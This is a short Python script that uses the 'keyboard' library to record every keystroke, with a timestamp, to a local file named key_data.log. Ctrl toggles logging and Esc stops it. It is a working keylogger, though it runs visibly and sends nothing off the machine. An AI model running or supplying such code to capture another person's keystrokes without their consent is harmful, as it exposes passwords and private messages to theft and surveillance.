import keyboard  # Import the library
from datetime import datetime

logging_enabled = True

def toggle_logging():
    global logging_enabled
    logging_enabled = not logging_enabled
    print(f"Logging {'enabled' if logging_enabled else 'disabled'}")

def log_key(e):
    if logging_enabled:
        with open("key_data.log", "a") as log_file:
            log_file.write(f"{datetime.now()} - {e.name}\n")  # Log timestamp and key

# Attach log_key to all key events

keyboard.add_hotkey('ctrl', toggle_logging)  # Toggle logging on/off
keyboard.hook(log_key)

# Keep the script running to capture all events
keyboard.wait('esc')  # Press 'esc' to stop logging
